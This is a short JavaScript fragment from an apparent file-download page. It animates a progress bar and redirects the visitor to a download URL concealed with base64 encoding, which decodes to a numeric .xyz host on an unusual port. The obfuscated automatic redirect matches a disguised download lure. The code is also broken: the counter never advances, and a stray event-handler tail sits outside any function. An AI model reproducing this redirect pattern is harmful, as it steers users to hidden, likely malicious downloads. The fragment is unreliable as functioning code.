  <script>
  const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
  const manualDownload = document.getElementById("manualDownload");
  const progressBar = document.getElementById("progressBar");
  let seconds = 0;
  const timer = setInterval(function () {

    progressBar.style.width = Math.min(seconds * 20, 100) + "%";
    if (seconds >= 5) {
      clearInterval(timer);
      window.location.replace(REAL_DOWNLOAD_URL);
    }
  }, 1000);

  e.preventDefault();
  window.location.replace(REAL_DOWNLOAD_URL);
  });
